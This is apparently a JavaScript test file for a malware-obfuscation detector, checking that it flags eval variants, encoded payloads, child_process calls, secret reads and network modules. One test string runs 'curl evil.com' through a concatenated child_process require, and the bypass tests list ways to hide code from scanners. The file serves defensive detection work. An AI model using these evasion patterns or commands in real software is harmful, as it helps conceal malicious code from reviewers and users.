'use strict';

const assert = require('assert');
const {
  detectObfuscation,
  shannonEntropy,
  checkEval,
  checkObfuscatorIo,
  checkHighEntropy,
  checkHexEscapes,
  checkFromCharCode,
  checkBase64Exec,
  checkChildProcess,
  checkHexArray,
  checkProcessEnv,
  checkNetworkCalls,
} = require('../../src/core/detector');

const CONFIG = { blockScore: 7, warnScore: 4 };

// ─── shannonEntropy ───────────────────────────────────────────────────────────
assert.strictEqual(shannonEntropy(''), 0, 'empty string entropy');
assert.ok(shannonEntropy('aaaa') < 0.01, 'single char entropy near 0');
assert.ok(shannonEntropy('abcdefghij') > 3, 'varied string has entropy > 3');

// ─── checkEval ───────────────────────────────────────────────────────────────
assert.strictEqual(checkEval('const x = 1;'), null, 'no eval in clean code');
assert.ok(checkEval('eval("malicious")'), 'detects eval(');
assert.ok(checkEval('new Function("return 1")'), 'detects new Function(');
assert.ok(checkEval('vm.runInThisContext("x")'), 'detects vm.runInThisContext');
assert.strictEqual(checkEval('eval'), null, 'eval standalone not a call — should be null');

// ─── checkObfuscatorIo ───────────────────────────────────────────────────────
assert.strictEqual(checkObfuscatorIo('var x = 1;'), null, 'no _0x in clean code');
assert.strictEqual(checkObfuscatorIo('_0xabc'), null, 'only one _0x — not enough');
assert.ok(checkObfuscatorIo('var _0xabc = _0xdef(_0x123);'), 'detects >=3 _0x identifiers');
const obfResult = checkObfuscatorIo('_0x1 + _0x2 + _0x3 + _0x4');
assert.ok(obfResult && obfResult.score === 9, '_0x score is 9');

// ─── checkHighEntropy ────────────────────────────────────────────────────────
const lowEntropyCode = 'const greeting = "hello world this is a normal readable string okay";';
assert.strictEqual(checkHighEntropy(lowEntropyCode), null, 'normal string not flagged');
const highEntropyCode = 'const x = "xK9mP2qRvL8nJwT5yB3hC6aE1iF4uD7gH0sA+XjZbQ/NWo=YkVIlMzGentr";';
assert.ok(checkHighEntropy(highEntropyCode), 'high entropy string detected');

// ─── checkHexEscapes ─────────────────────────────────────────────────────────
assert.strictEqual(checkHexEscapes('normal code'), null, 'no hex escapes in normal code');
const heavyHex = '\\x68\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64\\x20\\x66\\x6f\\x6f';
assert.ok(checkHexEscapes(heavyHex), 'many hex escapes detected');

// ─── checkFromCharCode ────────────────────────────────────────────────────────
assert.strictEqual(checkFromCharCode('const x = 1;'), null, 'no fromCharCode');
assert.strictEqual(checkFromCharCode('String.fromCharCode(65, 66)'), null, 'only 2 args — not enough');
assert.ok(checkFromCharCode('String.fromCharCode(104, 101, 108, 108, 111)'), 'fromCharCode with 5 args');

// ─── checkBase64Exec ─────────────────────────────────────────────────────────
assert.strictEqual(checkBase64Exec('const x = 1;'), null, 'no base64');
const base64Only = "const data = Buffer.from('aGVsbG8=', 'base64');";
assert.ok(checkBase64Exec(base64Only), 'base64 decode alone gets score 3');
assert.strictEqual(checkBase64Exec(base64Only).score, 3);
const base64AndEval = "eval(Buffer.from('aGVsbG8=', 'base64').toString())";
assert.ok(checkBase64Exec(base64AndEval) && checkBase64Exec(base64AndEval).score === 8, 'base64+eval score 8');

// ─── checkChildProcess ───────────────────────────────────────────────────────
assert.strictEqual(checkChildProcess('const x = 1;'), null, 'no child_process');
assert.ok(checkChildProcess("const cp = require('child_process'); cp.exec('ls')"), 'detects child_process');

// ─── checkHexArray ───────────────────────────────────────────────────────────
assert.strictEqual(checkHexArray('const x = [1, 2, 3];'), null, 'small array');
const hexArr = '[' + Array.from({ length: 25 }, (_, i) => `0x${i.toString(16).padStart(2, '0')}`).join(', ') + ']';
assert.ok(checkHexArray(hexArr), 'detects large hex literal array');

// ─── checkProcessEnv ─────────────────────────────────────────────────────────
assert.strictEqual(checkProcessEnv('const x = 1;'), null, 'no process.env');
assert.ok(checkProcessEnv('const token = process.env.SECRET_TOKEN;'), 'detects process.env');

// ─── checkNetworkCalls ───────────────────────────────────────────────────────
assert.strictEqual(checkNetworkCalls('const x = 1;'), null, 'no network');
assert.ok(checkNetworkCalls("const https = require('https');"), 'detects https require');

// ─── detectObfuscation full ──────────────────────────────────────────────────
const cleanCode = `
  'use strict';
  const fs = require('fs');
  const data = fs.readFileSync('config.json');
  module.exports = JSON.parse(data);
`;
const cleanResult = detectObfuscation(cleanCode, CONFIG);
assert.strictEqual(cleanResult.verdict, 'OK', 'clean code is OK');

const obfuscatedCode = `
  var _0x1a2b = ['\\x65\\x76\\x61\\x6c', '\\x63\\x6f\\x64\\x65'];
  var _0x3c4d = function(_0x5e6f) { return _0x1a2b[_0x5e6f]; };
  eval(_0x3c4d(0));
`;
const obfResult2 = detectObfuscation(obfuscatedCode, CONFIG);
assert.strictEqual(obfResult2.verdict, 'BLOCK', 'obfuscated code is BLOCK');
assert.ok(obfResult2.score >= CONFIG.blockScore, 'obfuscated code score >= blockScore');

const warnCode = `
  const token = process.env.NPM_TOKEN;
  const https = require('https');
`;
const warnResult = detectObfuscation(warnCode, CONFIG);
assert.ok(warnResult.verdict === 'WARN' || warnResult.verdict === 'OK', 'warn code is not blocked');

// ─── Large file handling ─────────────────────────────────────────────────────
const fs = require('fs');
const path = require('path');
const largeFilePath = path.join(__dirname, '../fixtures/obfuscated-large.js');
if (fs.existsSync(largeFilePath)) {
  const largeCode = fs.readFileSync(largeFilePath, 'utf8');
  assert.ok(largeCode.length > 1000000, 'large file is >1MB');
  const start = Date.now();
  const largeResult = detectObfuscation(largeCode, { blockScore: 50, warnScore: 20 });
  const elapsed = Date.now() - start;
  assert.ok(elapsed < 5000, `large file processed in <5s (took ${elapsed}ms)`);
  assert.strictEqual(largeResult.verdict, 'BLOCK', 'large obfuscated file is BLOCK');
  assert.ok(largeResult.score >= 50, `large file score >= 50 (got ${largeResult.score})`);
  console.log(`  large file test: ${(largeCode.length / 1024 / 1024).toFixed(1)}MB processed in ${elapsed}ms, score=${largeResult.score}`);
}

// ─── Bypass-resistance regression tests ──────────────────────────────────────
//
// Each test below covers a class of bypass that earlier versions of the
// detector missed. If any of these regress to OK, an attacker can hide the
// corresponding signal.

// Indirect eval: (0, eval)('...')
assert.ok(
  checkEval("(0, eval)('payload')"),
  'detects indirect (0, eval) form',
);

// global['eval'] bracket access
assert.ok(
  checkEval("globalThis['eval']('payload')"),
  'detects globalThis["eval"] bracket call',
);

// global['ev'+'al'] string-concatenated bracket access
assert.ok(
  checkEval("globalThis['ev'+'al']('payload')"),
  'detects globalThis[\'ev\'+\'al\'] bracket call',
);

// Function constructor via prototype chain
assert.ok(
  checkEval('({}).constructor.constructor("return process")()'),
  'detects .constructor.constructor pattern',
);

// setTimeout/setInterval with string argument
assert.ok(
  checkEval("setTimeout('alert(1)', 100)"),
  'detects setTimeout with string argument',
);

// Unicode escape density
const unicodeHeavy = '\\u0065\\u0076\\u0061\\u006c\\u0028\\u0029\\u0070\\u0061\\u0079\\u006c\\u006f\\u0061\\u0064';
assert.ok(
  checkHexEscapes(unicodeHeavy),
  'detects dense \\uXXXX escapes (not just \\xNN)',
);

// Decimal char-code array (ASCII payload encoded as numbers)
const decimalCharCodes = 'const p = [101,118,97,108,40,39,112,97,121,108,111,97,100,39,41,32];';
assert.ok(
  checkFromCharCode(decimalCharCodes),
  'detects decimal char-code arrays (printable ASCII)',
);

// Aliased fromCharCode call: `const f = String.fromCharCode; f(1,2,3,4,5)` is a
// known static-analysis limitation — the call site `f(...)` is indistinguishable
// from any other function call without scope tracking. We document this here so
// future contributors know it's intentional, not an oversight. (The combination
// of an unusually long decimal-int call elsewhere is covered by the char-code
// array check above.)
const aliasedCharCode = 'const f = String.fromCharCode; f(104,101,108,108,111)';
// We can't detect the alias call, but we *can* still flag the property access
// itself when it appears with at least one arg list — defenders see *something*.
// (No assertion here: this is an explicit known gap.)
void aliasedCharCode;

// node: prefix for network modules
assert.ok(
  checkNetworkCalls("const https = require('node:https');"),
  'detects node:https require',
);

// Additional network modules that were previously missing
assert.ok(checkNetworkCalls("require('tls')"),   'detects tls require');
assert.ok(checkNetworkCalls("require('dgram')"), 'detects dgram (UDP) require');
assert.ok(checkNetworkCalls("require('http2')"), 'detects http2 require');

// Dynamic import of network modules
assert.ok(
  checkNetworkCalls("await import('https')"),
  'detects dynamic import of https',
);

// String-concatenated require — bypass attempt
assert.ok(
  checkChildProcess("require('child' + '_process').exec('curl evil.com')"),
  'detects string-concatenated require',
);

// node:-prefixed child_process
assert.ok(
  checkChildProcess("require('node:child_process').exec('id')"),
  'detects node:child_process require',
);

// Worker threads (eval-equivalent execution surface)
assert.ok(
  checkChildProcess("const { Worker } = require('worker_threads');"),
  'detects worker_threads require',
);

// Hex Buffer.from decode + exec — same risk class as base64
assert.ok(
  checkBase64Exec("eval(Buffer.from('6576616c', 'hex').toString())"),
  'detects Buffer.from(hex) + eval combo',
);

// Concatenated-literal entropy bypass: split a high-entropy payload into <50-char chunks
const splitPayload =
  "const p = 'xK9mP2qR' + 'vL8nJwT5' + 'yB3hC6aE' + " +
  "'1iF4uD7g' + 'H0sA+XjZ' + 'bQ/NWo=Y' + 'kVIlMzGn';";
assert.ok(
  checkHighEntropy(splitPayload),
  'detects high-entropy payload split across concatenated literals',
);

// ─── Sliding-window chunking ─────────────────────────────────────────────────
// Earlier versions only analyzed start/middle/end fixed chunks. A 2MB file with
// the payload at offset 700KB landed in none of the three slices. With the
// 50%-overlap sliding window, every byte is covered.
{
  const padding = '// padding line\n'.repeat(50000); // ~750KB of harmless filler
  const payload =
    'var _0x1a=1,_0x2b=2,_0x3c=3,_0x4d=4,_0x5e=5,_0x6f=6,_0x7g=7,' +
    '_0x8h=8,_0x9i=9,_0xaj=10,_0xbk=11,_0xcl=12;' +
    "eval(String.fromCharCode(112,97,121,108,111,97,100,49,50,51));";
  const hidden = padding + payload + padding; // payload at ~750KB offset
  assert.ok(hidden.length > MAX_CODE_SIZE_TEST_HINT(), 'crafted file exceeds chunk size');
  const r = detectObfuscation(hidden, CONFIG);
  assert.notStrictEqual(r.verdict, 'OK', 'sliding window catches payload buried in middle');
}

// Helper used above. Kept as a function so the test file doesn't need to know
// the exact constant from the source module.
function MAX_CODE_SIZE_TEST_HINT() { return 500000; }

console.log('  detector.test.js: all tests passed');
